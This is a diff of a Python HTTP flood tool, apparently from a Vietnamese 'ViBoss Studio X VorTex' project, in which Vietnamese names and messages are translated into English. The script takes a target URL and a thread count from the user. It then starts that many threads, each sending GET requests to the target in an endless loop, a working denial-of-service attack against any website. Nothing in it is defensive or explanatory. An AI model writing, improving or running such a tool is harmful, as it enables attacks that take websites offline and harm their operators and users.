@@ -2,37 +2,37 @@ import os
 import requests
 import threading
 
-def tan_cong(target):
+def attack(target):
     try:
         while True:
             res = requests.get(target)
-            print("Đã gửi yêu cầu!")
+            print("Request sent!")
     except requests.exceptions.ConnectionError:
-        print("[!!!] Lỗi kết nối!")
+        print("[!!!] Connection error!")
 
 def print_centered_red(text):
-    # Thay đổi màu sắc văn bản sang đỏ
+    # Change text color to red
     RED = '\033[91m'
     RESET = '\033[0m'
     
-    # Lấy kích thước của cửa sổ terminal
+    # Get terminal window size
     try:
         columns, rows = os.get_terminal_size()
     except OSError:
         columns, rows = 80, 20
 
-    # Căn giữa văn bản
+    # Center text
     lines = text.split('\n')
     centered_lines = [(line.center(columns)) for line in lines]
     centered_text = '\n'.join(centered_lines)
     
-    # In văn bản màu đỏ
+    # Print text in red
     print(RED + centered_text + RESET)
 
-# Xóa màn hình trước khi in
+# Clear screen before printing
 os.system("cls" if os.name == "nt" else "clear")
 
-so_luong_luon = 100
+num_threads = 100
 
 print_centered_red("""
 ViBoss Studio  X   VorTex
@@ -40,23 +40,23 @@ ViBoss Studio  X   VorTex
 https://github.com/dhungx/ 
 """)
 
-url = input("Nhập URL: ")
+url = input("Enter URL: ")
 
 try:
-    so_luong_luon = int(input("Số lượng luồng: "))
+    num_threads = int(input("Number of threads: "))
 except ValueError:
-    exit("Số lượng luồng không hợp lệ!")
+    exit("Invalid number of threads!")
 
-if so_luong_luon == 0:
-    exit("Số lượng luồng không hợp lệ!")
+if num_threads == 0:
+    exit("Invalid number of threads!")
 
 if not url.__contains__("http"):
-    exit("URL không chứa http hoặc https!")
+    exit("URL does not contain http or https!")
 
 if not url.__contains__("."):
-    exit("Tên miền không hợp lệ!")
+    exit("Invalid domain name!")
 
-for i in range(0, so_luong_luon):
-    luong = threading.Thread(target=tan_cong, args=(url,))
-    luong.start()
-    print(str(i + 1) + " luồng đã được khởi động!")
+for i in range(0, num_threads):
+    thread = threading.Thread(target=attack, args=(url,))
+    thread.start()
+    print(str(i + 1) + " threads have been started!")
